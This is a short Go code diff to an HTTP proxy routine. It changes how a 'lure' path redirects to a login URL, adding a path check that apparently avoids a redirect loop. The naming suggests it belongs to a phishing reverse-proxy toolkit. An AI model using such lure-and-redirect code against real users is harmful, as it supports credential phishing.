@@ -580,10 +580,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if err == nil {
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
-						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-						if resp != nil {
-							resp.Header.Add("Location", rurl)
-							return req, resp
+						u, err := url.Parse(rurl)
+						if err == nil {
+							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
+								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+								if resp != nil {
+									resp.Header.Add("Location", rurl)
+									return req, resp
+								}
+							}
 						}
 					}
 				}
